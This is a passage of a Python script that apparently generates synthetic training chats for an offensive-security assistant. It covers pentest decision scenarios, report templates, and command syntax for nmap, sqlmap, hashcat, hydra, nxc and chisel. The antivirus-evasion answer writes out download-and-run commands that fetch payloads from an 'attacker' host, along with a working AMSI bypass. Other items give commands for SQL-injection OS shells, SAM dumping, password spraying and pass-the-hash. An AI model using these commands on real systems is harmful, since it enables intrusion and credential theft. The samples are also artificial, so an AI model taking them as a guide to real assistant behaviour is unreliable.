            "user": "I have RCE on the web server but it's a production system serving customers. Should I escalate or hold?",
            "assistant": """**Operational Decision: HOLD — Do Not Escalate on Production**

**Reasoning:**
1. **Production system** — any disruption affects real customers
2. **RCE is sufficient evidence** — we've proven the vulnerability exists
3. **Privilege escalation risk** — kernel exploits or misconfigs could crash the service
4. **Scope of proof** — we have command execution, which demonstrates full impact

**What to do instead:**
1. **Document the finding** with evidence (command output showing whoami, uname, etc.)
2. **Demonstrate impact** minimally — read /etc/passwd (non-disruptive proof)
3. **Do NOT:**
   - Run exploits that modify system state
   - Install persistence mechanisms
   - Access real customer data
   - Pivot from this host to other production systems

**Report recommendation:**
- Severity: CRITICAL (RCE, unauthenticated)
- Evidence: Command execution as www-data
- Impact statement: "Full server compromise achievable; held at command execution to avoid production impact"
- Recommend: Test privilege escalation in staging environment

**Communication:** Notify the client immediately about this critical finding. They may want to patch before we continue testing.""",
        },
        {
            "user": "We found creds in a config file: db_admin:Pr0d_DB_2024!. The database has customer PII. How much do we access?",
            "assistant": """**Operational Decision: MINIMAL ACCESS — Prove Impact Without PII Exposure**

**Reasoning:**
1. **PII regulations** (GDPR, CCPA, etc.) — even authorized testers should minimize PII access
2. **Proof of access** is sufficient — we don't need to dump 1M records
3. **Legal liability** — handling PII creates reporting obligations
4. **Client trust** — demonstrate professionalism

**Approved actions:**
1. **Confirm authentication:** Connect and verify credentials work
   ```sql
   SELECT current_user(), version();
   ```
2. **Enumerate scope:** List databases and tables (metadata only)
   ```sql
   SHOW DATABASES; SHOW TABLES;
   ```
3. **Prove data access:** Query with LIMIT and ONLY from test/sample row
   ```sql
   SELECT COUNT(*) FROM customers;  -- Row count only
   SELECT id, LEFT(email, 3) || '***' FROM customers LIMIT 3;  -- Redacted sample
   ```

**DO NOT:**
- Dump full tables
- Export customer records
- Access payment/financial data
- Copy the database

**Evidence for report:**
- Screenshot: Successful authentication
- Screenshot: Table list showing customer_data, payment_info tables exist
- Screenshot: Row count (proves access to all records)
- Redacted sample (3 rows, emails partially masked)

**This proves the same impact** (full database access, X million records at risk) without actually exposing PII.""",
        },
        {
            "user": "It's Friday 4pm. We just got Domain Admin. Do we continue or stop?",
            "assistant": """**Operational Decision: DOCUMENT AND STOP — Resume Monday**

**Reasoning:**
1. **Achieved primary objective** — Domain Admin is typically the pentest goal
2. **Friday afternoon risk** — if something goes wrong, no one is available to respond
3. **Client's security team** likely leaving for weekend — no monitoring coverage
4. **Our fatigue** — decision-making degrades late in the week; mistakes happen

**Actions before stopping:**
1. **Document everything:**
   - Full attack chain from initial access to DA
   - All credentials obtained
   - All hosts touched
   - All tools deployed
   - Timeline of actions

2. **Secure your access:**
   - Save tickets/hashes locally (don't need persistence on target)
   - Document the path to regain access Monday
   - DO NOT install persistence (unnecessary risk over weekend)

3. **Notify client:**
   - "Domain Admin achieved as of [timestamp]"
   - "Stopping active testing for the weekend"
   - "Will debrief Monday on next steps"

**Monday plan:**
- Verify access still works
- Discuss with client: Crown Jewels access? Post-exploitation objectives?
- Consider: Do they want us to test their detection (did they notice DA compromise)?
- Continue with post-exploitation objectives if authorized

**Never continue high-impact testing** when:
- No incident response coverage
- Late in day (fatigue)
- Just achieved major milestone (take time to document)
- Weekend/holiday approaching""",
        },
        {
            "user": "The IDS caught our nmap scan and the SOC reached out to the client. What do we do?",
            "assistant": """**Operational Decision: PAUSE AND COORDINATE**

**This is normal and expected.** Getting caught is part of the process — it tests the client's detection capabilities. Handle professionally:

**Immediate actions:**
1. **Pause active scanning** — don't trigger more alerts while coordinating
2. **Contact the client POC** — confirm they informed the SOC about the test
3. **Document the detection:**
   - What triggered the alert? (scan type, rate, source IP)
   - How long were we active before detection? (dwell time metric)
   - What was the SOC's response time? (MTTR metric)

**Communication template to client:**
> "Hi [POC], your SOC correctly identified our scanning activity from [IP]. This is a positive detection. Can you:
> 1. Confirm with SOC that this is authorized testing
> 2. Let us know if you want us to continue with current approach or adjust
> 3. Provide the SOC alert details (we'll include in report as a positive finding)"

**After coordination:**
- **Option A:** Client whitelists our IP — continue testing unimpeded
- **Option B:** Client says "evade detection" — switch to slower, stealthier approach
- **Option C:** Client wants to test SOC further — continue as-is, track detections

**Report inclusion:**
This becomes a POSITIVE finding in the report:
- "SOC successfully detected network scanning within X minutes"
- "Response procedure was appropriate: [describe their actions]"
- Grade their detection capability

**Adjust approach if continuing:**
- Reduce scan rate (--max-rate 100)
- Fragment packets (nmap -f)
- Use targeted scans instead of sweeps
- Shift to application-layer testing (less network noise)""",
        },
        {
            "user": "We have local admin on a workstation that has Symantec Endpoint Protection running. Should we disable AV or work around it?",
            "assistant": """**Operational Decision: WORK AROUND IT — Do NOT Disable AV**

**Reasoning:**
1. **Disabling AV is noisy** — generates alerts, defeats the purpose of testing
2. **Real attackers evade, not disable** — our test should mirror real threats
3. **Detection testing value** — does the AV catch our tools? That's useful data
4. **Client trust** — disabling protections feels like "cheating"

**Evasion approaches (from least to most effort):**

**1. Living off the land (LOL) — no custom tools needed:**
```
# Use built-in Windows tools that AV won't flag
certutil -urlcache -split -f http://attacker/payload.exe C:\\Temp\\p.exe
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

**2. AMSI bypass (in-memory):**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**3. Custom payload (AV won't have signatures):**
- Generate fresh payload with unique encryption
- Use process injection into legitimate process
- Avoid known tool signatures (don't use stock Mimikatz)

**4. Document what gets caught:**
- If Mimikatz is blocked → that's a positive finding for the client
- Record: "Symantec blocked X, evaded with Y"
- This becomes valuable data in the report

**Report note:**
- "Endpoint protection successfully blocked [tool/technique]"
- "Bypassed protection via [method] — recommend [improvement]"
- This gives the client actionable security improvement data""",
        },
    ]

    for _ in range(800):
        scenario = random.choice(scenarios)
        samples.append(make_sample(SYSTEM_FULLSTACK, scenario["user"], scenario["assistant"]))

    return samples


def gen_engagement_report_writing():
    """Report writing samples."""
    samples = []

    for _ in range(600):
        domain = rand_domain()
        company = domain.split('.')[0].replace('-', ' ').title()
        num_critical = random.randint(1, 5)
        num_high = random.randint(3, 10)
        num_medium = random.randint(5, 15)
        num_low = random.randint(8, 25)

        user = random.choice([
            f"Write the executive summary for the {company} pentest report. {num_critical} critical, {num_high} high, {num_medium} medium, {num_low} low findings.",
            f"Draft a finding report entry for: SQL Injection on {domain}/api/search. CVSS 9.8, unauthenticated, full database access.",
            f"Write the remediation roadmap for {company}. We found {num_critical + num_high} critical/high issues including RCE, SQLi, and default credentials.",
        ])

        if "executive summary" in user.lower():
            assistant = f"""**Executive Summary**

**{company} — External Penetration Test Report**

**Engagement Period:** {datetime.now().strftime('%B %d')} - {(datetime.now() + timedelta(days=14)).strftime('%B %d, %Y')}
**Scope:** External attack surface of {domain}
**Classification:** CONFIDENTIAL

---

**Overall Risk Rating: {"CRITICAL" if num_critical >= 3 else "HIGH"}**

During this assessment, our team identified **{num_critical + num_high + num_medium + num_low} vulnerabilities** across {company}'s external infrastructure:

| Severity | Count | Immediate Risk |
|----------|-------|---------------|
| Critical | {num_critical} | Active exploitation possible |
| High | {num_high} | Significant data exposure |
| Medium | {num_medium} | Moderate risk |
| Low | {num_low} | Minimal direct impact |

**Key Findings:**
1. **{"Remote Code Execution" if num_critical >= 2 else "Authentication Bypass"}** — Unauthenticated attackers can {"execute arbitrary commands on production servers" if num_critical >= 2 else "access administrative functionality without credentials"}, potentially leading to full infrastructure compromise.

2. **{"SQL Injection" if num_critical >= 1 else "Sensitive Data Exposure"}** — {"Database access achieved through injection vulnerabilities, exposing customer PII and financial records" if num_critical >= 1 else "Sensitive configuration data and credentials exposed through misconfigured services"}.

3. **{"Weak Authentication"  }** — Multiple systems found with default or easily guessable credentials, enabling unauthorized access.

**Business Impact:**
If exploited by a malicious actor, the identified vulnerabilities could result in:
- Unauthorized access to customer data ({random.randint(10, 500)}K+ records)
- Complete compromise of external-facing infrastructure
- Potential pivot to internal network
- Regulatory implications ({"GDPR, CCPA" if random.random() > 0.5 else "PCI-DSS, SOC2"})
- Estimated financial impact: ${"".join([str(random.randint(1,9)) for _ in range(random.randint(5,7))])} (breach cost modeling)

**Strategic Recommendations:**
1. **Immediate (0-48 hours):** Patch critical vulnerabilities, rotate exposed credentials
2. **Short-term (1-4 weeks):** Implement WAF rules, enable MFA on all admin panels
3. **Medium-term (1-3 months):** Security architecture review, implement SAST/DAST in CI/CD
4. **Long-term:** Establish vulnerability management program, regular penetration testing cadence"""

        elif "finding report" in user.lower() or "sql injection" in user.lower():
            assistant = f"""**Finding: SQL Injection — /api/search Endpoint**

---

| Field | Value |
|-------|-------|
| ID | FINDING-001 |
| Severity | **CRITICAL** |
| CVSS v3.1 | **9.8** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | CWE-89: SQL Injection |
| Target | https://{domain}/api/search |
| Status | Confirmed exploitable |

**Description:**
The search functionality at `/api/search` is vulnerable to SQL injection through the `q` parameter. The application directly concatenates user input into SQL queries without parameterization or adequate input validation. This allows an unauthenticated attacker to read, modify, or delete all data in the backend database.

**Reproduction Steps:**
1. Navigate to `https://{domain}/api/search?q=test`
2. Inject the following payload: `test' UNION SELECT NULL,username,password,NULL FROM users--`
3. Observe that user credentials are returned in the response

**Evidence:**
```
GET /api/search?q=test'+UNION+SELECT+NULL,username,password,NULL+FROM+users-- HTTP/1.1
Host: {domain}

HTTP/1.1 200 OK
Content-Type: application/json

{{"results": [{{"name": "admin", "description": "$2b$12$LJ3m4sMKxV6..."}}, ...]}}
```

**Impact:**
- Full database read access (all tables, all data)
- Potential write access (INSERT, UPDATE, DELETE)
- Customer PII exposure ({random.randint(50, 500)}K+ records)
- Authentication bypass (admin credential extraction)
- Potential for OS command execution (via xp_cmdshell/INTO OUTFILE)

**Remediation:**
1. **Immediate:** Use parameterized queries / prepared statements for ALL database interactions
2. **Code fix example:**
   ```python
   # VULNERABLE:
   query = f"SELECT * FROM products WHERE name LIKE '%{{search_term}}%'"

   # FIXED:
   query = "SELECT * FROM products WHERE name LIKE %s"
   cursor.execute(query, (f"%{{search_term}}%",))
   ```
3. **Defense in depth:** Implement WAF rules, input validation, least-privilege DB accounts
4. **Verification:** Retest after fix to confirm remediation"""

        else:  # remediation roadmap
            assistant = f"""**Remediation Roadmap — {company}**

---

**Priority Matrix:**

| Timeline | Items | Effort | Risk Reduction |
|----------|-------|--------|----------------|
| Immediate (0-48h) | {num_critical} critical | Low-Medium | 60% |
| Week 1-2 | {num_high} high | Medium | 25% |
| Month 1-3 | {num_medium} medium | Medium-High | 10% |
| Month 3-6 | {num_low} low | Low | 5% |

---

**IMMEDIATE (0-48 hours) — Critical Findings:**

1. **Patch RCE vulnerability**
   - Effort: 2-4 hours
   - Action: Update affected component to latest version
   - Verify: Rerun nuclei template to confirm fix

2. **Rotate all exposed credentials**
   - Effort: 1-2 hours
   - Action: Change passwords found in config files, default creds on admin panels
   - Verify: Attempt login with old credentials

3. **Fix SQL injection**
   - Effort: 4-8 hours
   - Action: Parameterize all database queries in search functionality
   - Verify: Rerun sqlmap against the endpoint

**WEEK 1-2 — High Findings:**

4. **Implement authentication on admin panels**
   - Effort: 1-2 days
   - Action: Remove default creds, enforce strong passwords + MFA

5. **Restrict file upload functionality**
   - Effort: 1 day
   - Action: Whitelist allowed extensions, validate content type, store outside webroot

6. **Fix IDOR vulnerabilities**
   - Effort: 2-3 days
   - Action: Implement proper authorization checks on all API endpoints

**MONTH 1-3 — Architectural Improvements:**

7. **Deploy Web Application Firewall (WAF)**
8. **Implement Content Security Policy headers**
9. **Enable comprehensive logging and alerting**
10. **Establish vulnerability scanning in CI/CD pipeline**

**MONTH 3-6 — Strategic Hardening:**

11. **Security awareness training for developers**
12. **Implement SAST/DAST in development workflow**
13. **Regular third-party penetration testing (quarterly)**
14. **Bug bounty program consideration**

**Retest:** We recommend retesting critical/high findings within 30 days of remediation."""

        samples.append(make_sample(SYSTEM_FULLSTACK, user, assistant))

    return samples


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CATEGORY 6: TOOL MASTERY (5,000+ samples)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_tool_mastery_syntax():
    """Complete command syntax and flag knowledge."""
    samples = []

    tools = [
        {
            "name": "nmap",
            "scenarios": [
                ("Scan all TCP ports with version detection on {target}", "nmap -sV -p- {target} -oA /tmp/nmap_{target}"),
                ("Fast SYN scan top 1000 ports on {target}", "nmap -sS --top-ports 1000 -T4 {target}"),
                ("UDP scan top 100 ports on {target}", "nmap -sU --top-ports 100 -T4 {target}"),
                ("Aggressive scan with OS detection and scripts on {target}", "nmap -A -T4 {target}"),
                ("Scan for SMB vulnerabilities on {target}", "nmap --script=smb-vuln* -p 445 {target}"),
                ("Scan subnet {subnet} for live hosts only", "nmap -sn {subnet} -oG /tmp/alive.gnmap"),
                ("Scan {target} with all NSE scripts in vuln category", "nmap --script vuln -sV {target}"),
                ("Stealth scan {target} with decoys", "nmap -sS -D RND:10 -T2 --randomize-hosts {target}"),
            ],
        },
        {
            "name": "nuclei",
            "scenarios": [
                ("Scan {target} for critical and high severity issues", "nuclei -u https://{target} -severity critical,high -o /tmp/nuclei_results.txt"),
                ("Scan a list of URLs with all templates", "nuclei -l /tmp/urls.txt -t /root/nuclei-templates/ -c 50 -o /tmp/nuclei_all.txt"),
                ("Run only CVE templates against {target}", "nuclei -u https://{target} -t /root/nuclei-templates/cves/ -severity critical,high"),
                ("Scan with custom rate limit to avoid WAF", "nuclei -u https://{target} -rl 10 -c 5 -timeout 15"),
                ("Scan for exposed panels and default logins", "nuclei -u https://{target} -t /root/nuclei-templates/exposed-panels/ -t /root/nuclei-templates/default-logins/"),
                ("Run nuclei with headless browser for JS-rendered targets", "nuclei -u https://{target} -headless -t /root/nuclei-templates/headless/"),
            ],
        },
        {
            "name": "ffuf",
            "scenarios": [
                ("Directory brute force on {target}", "ffuf -u https://{target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -mc 200,301,302,403"),
                ("Fuzz GET parameter for SQLi on {target}", "ffuf -u 'https://{target}/search?q=FUZZ' -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -mc all -fc 404"),
                ("Virtual host discovery on {target}", "ffuf -u https://{target}/ -H 'Host: FUZZ.{target}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"),
                ("Fuzz API endpoints with POST", "ffuf -u https://{target}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -X POST -mc 200,201,401,403"),
                ("Recursive directory scan with extensions", "ffuf -u https://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.asp,.jsp,.bak,.old -recursion -recursion-depth 3"),
            ],
        },
        {
            "name": "sqlmap",
            "scenarios": [
                ("Test URL parameter for SQLi", "sqlmap -u 'https://{target}/page?id=1' --batch --dbs"),
                ("Test POST login form for SQLi", "sqlmap -u 'https://{target}/login' --data='user=admin&pass=test' --batch --risk 3 --level 5"),
                ("Dump specific database and table", "sqlmap -u 'https://{target}/page?id=1' --batch -D app_db -T users --dump"),
                ("SQLi with WAF bypass", "sqlmap -u 'https://{target}/page?id=1' --batch --tamper=between,randomcase,space2comment --random-agent"),
                ("OS shell via SQL injection", "sqlmap -u 'https://{target}/page?id=1' --batch --os-shell"),
                ("Test with custom cookie/auth", "sqlmap -u 'https://{target}/api/data?q=1' --cookie='session=abc123' --headers='Authorization: Bearer token123' --batch --dbs"),
            ],
        },
        {
            "name": "feroxbuster",
            "scenarios": [
                ("Recursive content discovery on {target}", "feroxbuster -u https://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 -d 3 -o /tmp/ferox_results.txt"),
                ("Scan with specific extensions", "feroxbuster -u https://{target} -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,bak,old,conf -t 50"),
                ("Scan with authentication header", "feroxbuster -u https://{target} -w /usr/share/seclists/Discovery/Web-Content/common.txt -H 'Authorization: Bearer {token}' -t 50"),
                ("Aggressive scan with all options", "feroxbuster -u https://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --auto-tune --collect-words --collect-backups -t 100 -d 4"),
            ],
        },
        {
            "name": "hashcat",
            "scenarios": [
                ("Crack NTLM hashes with rockyou", "hashcat -m 1000 /tmp/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule -O"),
                ("Crack Kerberos TGS hashes", "hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/d3ad0ne.rule"),
                ("Brute force 8-char password with mask", "hashcat -m 1000 /tmp/hash.txt -a 3 '?u?l?l?l?l?l?d?d' --increment --increment-min 6"),
                ("Crack bcrypt hashes", "hashcat -m 3200 /tmp/bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3"),
                ("Combinator attack with two wordlists", "hashcat -m 0 /tmp/hashes.txt -a 1 /tmp/wordlist1.txt /tmp/wordlist2.txt"),
                ("Show cracked results", "hashcat -m 1000 /tmp/ntlm_hashes.txt --show"),
            ],
        },
        {
            "name": "crackmapexec/nxc",
            "scenarios": [
                ("Enumerate SMB shares on subnet", "nxc smb {subnet} -u '' -p '' --shares"),
                ("Password spray against domain", "nxc smb {target} -u /tmp/users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success"),
                ("Check local admin access", "nxc smb {subnet} -u admin -p 'Password1' --local-auth"),
                ("Dump SAM database", "nxc smb {target} -u admin -p 'Password1' --sam"),
                ("Execute command via WMI", "nxc wmi {target} -u admin -p 'Password1' -x 'whoami /all'"),
                ("Enumerate logged-on users", "nxc smb {subnet} -u jsmith -p 'Password1' --loggedon-users"),
                ("Pass-the-hash authentication", "nxc smb {target} -u Administrator -H '{hash}' --shares"),
            ],
        },
        {
            "name": "bbot",
            "scenarios": [
                ("Full subdomain enumeration", "bbot -t {domain} -p subdomain-enum -o /root/.bbot/scans/{domain}"),
                ("Web vulnerability scan", "bbot -t {domain} -p web-thorough -o /root/.bbot/scans/{domain}_web"),
                ("Subdomain enum with custom config", "bbot -t {domain} -p subdomain-enum --config modules.massdns.wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"),
                ("Scan with specific modules only", "bbot -t {domain} -m nmap httpx nuclei -o /root/.bbot/scans/{domain}_targeted"),
                ("Cloud enumeration", "bbot -t {domain} -f cloud-enum -o /root/.bbot/scans/{domain}_cloud"),
            ],
        },
        {
            "name": "hydra",
            "scenarios": [
                ("Brute force SSH login", "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4 -f"),
                ("Brute force HTTP POST login", "hydra -l admin -P /tmp/passwords.txt {target} http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials' -t 10"),
                ("Brute force FTP with user list", "hydra -L /tmp/users.txt -P /tmp/passwords.txt ftp://{target} -t 8"),
                ("Brute force RDP", "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{target} -t 1 -w 5"),
                ("Brute force SMB", "hydra -L /tmp/users.txt -p 'Summer2024!' smb://{target} -t 4"),
            ],
        },
        {
            "name": "gobuster",
            "scenarios": [
                ("Directory enumeration", "gobuster dir -u https://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -o /tmp/gobuster.txt"),
                ("DNS subdomain brute force", "gobuster dns -d {domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50"),
                ("VHOST discovery", "gobuster vhost -u https://{target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"),
                ("Directory enum with extensions and status codes", "gobuster dir -u https://{target} -w /usr/share/wordlists/dirb/common.txt -x php,asp,txt,bak -s 200,301,302,403 -t 30"),
            ],
        },
    ]

    for _ in range(1400):
        tool = random.choice(tools)
        scenario = random.choice(tool["scenarios"])
        user_text, cmd = scenario

        target = rand_ip() if random.random() > 0.4 else rand_subdomain()
        domain = rand_domain()
        subnet = f"{rand_ip().rsplit('.', 1)[0]}.0/24"
        token = rand_hash("sha256")[:30]
        nt_hash = rand_hash("md5")

        user_formatted = user_text.format(target=target, domain=domain, subnet=subnet)
        cmd_formatted = cmd.format(target=target, domain=domain, subnet=subnet, token=token, hash=nt_hash)

        user_msg = random.choice([
            user_formatted,
            f"What's the {tool['name']} command to: {user_formatted.lower()}",
            f"Give me the exact {tool['name']} syntax for: {user_formatted.lower()}",
        ])

        assistant = f"""<exec timeout="{"3600" if tool["name"] in ["nmap", "bbot", "hashcat"] else "300"}">{cmd_formatted}</exec>

**Command breakdown:**
{chr(10).join([f"- `{part}`: {_explain_flag(tool['name'], part)}" for part in cmd_formatted.split() if part.startswith('-') or part.startswith('--')][:5])}

**Expected behavior:**
- {"Scan may take several minutes depending on network size" if tool["name"] in ["nmap", "bbot", "masscan"] else "Results will appear as matches are found" if tool["name"] in ["ffuf", "gobuster", "feroxbuster"] else "Processing speed depends on hash type and GPU" if tool["name"] == "hashcat" else "Will attempt connections at specified thread count"}
- Output saved to {"file specified with -o flag" if any(x in cmd_formatted for x in ["-o ", "-oA ", "--output"]) else "stdout (pipe to file if needed)"}

**If this doesn't work:**
- {"Try reducing thread count if target is rate limiting" if tool["name"] in ["ffuf", "gobuster", "hydra"] else "Check connectivity: ensure target is reachable" if tool["name"] == "nmap" else "Verify hash format matches the mode (-m)" if tool["name"] == "hashcat" else "Check credentials are correct"}
- {"Add --random-agent to avoid WAF fingerprinting" if tool["name"] in ["sqlmap", "ffuf", "nuclei"] else "Try with -T2 for slower, stealthier scan" if tool["name"] == "nmap" else ""}"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user_msg, assistant))

    return samples


def _explain_flag(tool, flag):
    """Generate flag explanation."""
    explanations = {
        "-sV": "Service version detection",
        "-sS": "SYN stealth scan",
        "-sU": "UDP scan",
        "-sn": "Host discovery only (no port scan)",
        "-p-": "Scan all 65535 ports",
        "-T4": "Aggressive timing template",
        "-T2": "Polite timing (slower, stealthier)",
        "-A": "Aggressive: OS detection + version + scripts + traceroute",
        "-O": "OS detection",
        "--top-ports": "Scan N most common ports",
        "--script": "Run specified NSE scripts",
        "-oA": "Output in all formats (nmap, XML, greppable)",
        "--batch": "Non-interactive mode (auto-accept defaults)",
        "--dbs": "Enumerate databases",
        "--risk": "Risk level (1-3, higher = more aggressive tests)",
        "--level": "Test level (1-5, higher = more tests)",
        "--tamper": "Use tamper scripts to bypass WAF/filters",
        "-w": "Wordlist file",
        "-t": "Number of threads",
        "-u": "Target URL",
        "-c": "Concurrency / threads",
        "-d": "Recursion depth",
        "-x": "File extensions to check",
        "-m": "Hash mode (type)",
        "-a": "Attack mode (0=dict, 1=combo, 3=mask, 6=hybrid)",
        "--rules-file": "Apply rules to mutate wordlist entries",
        "-f": "Stop on first valid result",
        "-l": "Login/username",
        "-L": "Username list file",
        "-P": "Password list file",
        "-p": "Port / password",
        "--severity": "Filter by vulnerability severity",
        "-rl": "Rate limit (requests per second)",
        "--shares": "Enumerate accessible SMB shares",
        "--sam": "Dump SAM database hashes",
        "--no-bruteforce": "One password per user (spray mode)",
        "-H": "Custom header / NTLM hash",
        "--continue-on-success": "Keep testing after finding valid creds",
        "-D": "Decoy IPs for scan evasion",
    }
    clean_flag = flag.split('=')[0].split(' ')[0]
    return explanations.get(clean_flag, f"Option for {tool}")


def gen_tool_selection():
    """Tool selection: given a situation, which tool?"""
    samples = []

    situations = [
        {
            "situation": "I need to find all subdomains of {domain} quickly",
            "answer": "subfinder",
            "reasoning": "subfinder is the fastest passive subdomain enumeration tool. It queries multiple data sources (crt.sh, Shodan, VirusTotal, etc.) without making DNS requests to the target. For active enumeration, follow up with massdns or bbot.",
            "cmd": "subfinder -d {domain} -all -silent | sort -u",
            "alternatives": "amass (more thorough but slower), bbot (full pipeline), sublist3r (older, fewer sources)",
        },
        {
            "situation": "I need to brute-force directories on a web server at {target}",
            "answer": "feroxbuster",
            "reasoning": "feroxbuster is the fastest recursive content discovery tool. It auto-detects interesting directories and recurses into them, handles status codes intelligently, and is written in Rust for maximum speed.",
            "cmd": "feroxbuster -u https://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -d 3",
            "alternatives": "ffuf (more flexible, better for fuzzing params), gobuster (simpler, no recursion), dirsearch (Python, good for custom extensions)",
        },
        {
            "situation": "I found credentials and need to test them across multiple services on a Windows network",
            "answer": "crackmapexec/nxc",
            "reasoning": "NetExec (nxc) is purpose-built for testing credentials across Windows networks. It supports SMB, WinRM, LDAP, MSSQL, SSH, and more in a single tool. It efficiently tests one credential against many hosts.",
            "cmd": "nxc smb {subnet} -u admin -p 'Password1' --local-auth --shares",
            "alternatives": "impacket-psexec (individual shell), evil-winrm (WinRM shell), Metasploit (broader but slower)",
        },
        {
            "situation": "I need to tunnel traffic through a compromised Linux host to reach an internal network",
            "answer": "chisel",
            "reasoning": "Chisel is a single-binary TCP/UDP tunneling tool that creates encrypted SOCKS5 proxies. It's lightweight, cross-platform, and the traffic looks like normal HTTPS. Perfect for pivoting through compromised hosts.",
            "cmd": "# Attacker: chisel server --reverse --port 8001\n# Target: ./chisel client {attacker}:8001 R:socks",
            "alternatives": "ligolo-ng (kernel-level, more stable), SSH -D (if SSH available), socat (flexible but complex)",
        },
        {
            "situation": "I have NTLM hashes and need to crack them offline",
            "answer": "hashcat",
            "reasoning": "hashcat is the gold standard for GPU-accelerated password cracking. NTLM (mode 1000) cracks at ~100 GH/s on modern GPUs, making it feasible to brute-force 8-character passwords in hours.",
            "cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule -O",
            "alternatives": "john (CPU-focused, better rule engine), ophcrack (rainbow tables, outdated), hashcat with masks for brute force",
        },
        {
            "situation": "I need to scan {target} for known CVEs quickly",
            "answer": "nuclei",
            "reasoning": "nuclei has the largest open-source vulnerability template library (7000+ templates). It's fast, supports custom templates, and produces low false-positive results. Best for automated CVE detection across web services.",
            "cmd": "nuclei -u https://{target} -severity critical,high -c 50 -o /tmp/nuclei_results.txt",
            "alternatives": "nmap --script vuln (network-level), nikto (web scanner, high FP), OpenVAS (enterprise, comprehensive)",
        },
        {
            "situation": "I need to perform Kerberoasting against an Active Directory domain",
            "answer": "impacket-GetUserSPNs",
            "reasoning": "GetUserSPNs from impacket is the standard tool for Kerberoasting. It identifies service accounts with SPNs and requests TGS tickets that can be cracked offline. Works remotely — no need for a domain-joined machine.",
            "cmd": "impacket-GetUserSPNs {domain}/jsmith:'Password1' -dc-ip {target} -request -outputfile /tmp/kerberoast.txt",
            "alternatives": "Rubeus (on Windows, more features), PowerView (PowerShell), BloodHound (identifies targets)",
        },
        {
            "situation": "I need to enumerate an Active Directory domain and find attack paths",
            "answer": "BloodHound + SharpHound/bloodhound-python",
            "reasoning": "BloodHound visualizes AD attack paths by collecting relationship data (group memberships, sessions, ACLs) and computing shortest paths to high-value targets. Essential for understanding complex AD environments.",
            "cmd": "bloodhound-python -c All -u jsmith -p 'Password1' -d {domain} -ns {target}",
            "alternatives": "PowerView (manual enumeration), ADExplorer (GUI, by Sysinternals), ldapdomaindump (LDAP only)",
        },
    ]

    for _ in range(1000):
        sit = random.choice(situations)
        target = rand_ip()
        domain = rand_domain()
        subnet = f"{target.rsplit('.', 1)[0]}.0/24"
        attacker = "10.10.14.5"

        situation_formatted = sit["situation"].format(target=target, domain=domain, subnet=subnet, attacker=attacker)
        cmd_formatted = sit["cmd"].format(target=target, domain=domain, subnet=subnet, attacker=attacker)

        user = random.choice([
            situation_formatted,
            f"What tool should I use? {situation_formatted}",
            f"Best tool for this: {situation_formatted}",
        ])

        assistant = f"""**Recommended: `{sit["answer"]}`**

**Why:** {sit["reasoning"]}

**Command:**
<exec timeout="300">{cmd_formatted}</exec>

**Alternatives:** {sit["alternatives"]}

**When to use alternatives instead:**
- {"Use amass for maximum coverage in high-value targets (slower but more complete)" if sit["answer"] == "subfinder" else "Use ffuf when you need to fuzz parameters, headers, or POST data" if sit["answer"] == "feroxbuster" else "Use impacket directly when you need a specific protocol interaction" if sit["answer"] in ["crackmapexec/nxc", "nxc"] else "Use ligolo-ng for long-term tunnels that need stability" if sit["answer"] == "chisel" else "Use john when you need better rule flexibility or CPU-only cracking" if sit["answer"] == "hashcat" else "Use nmap --script vuln for network-level vulnerabilities" if sit["answer"] == "nuclei" else "Use alternative when primary tool isn't available"}"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_tool_output_interpretation():
    """Output interpretation: given tool output, what does it mean?"""
    samples = []

    outputs = [
        {
            "tool": "nmap",
            "output": lambda: f"""PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH {random.choice(SERVICE_VERSIONS['openssh'])} Ubuntu
80/tcp    open  http          Apache httpd {random.choice(SERVICE_VERSIONS['apache'])}
111/tcp   open  rpcbind       2-4 (RPC #100000)
139/tcp   open  netbios-ssn   Samba smbd {random.choice(SERVICE_VERSIONS['samba'][:3])}
445/tcp   open  netbios-ssn   Samba smbd {random.choice(SERVICE_VERSIONS['samba'][:3])}
2049/tcp  open  nfs_acl       3 (RPC #100227)
3306/tcp  open  mysql         MySQL {random.choice(SERVICE_VERSIONS['mysql'])}""",
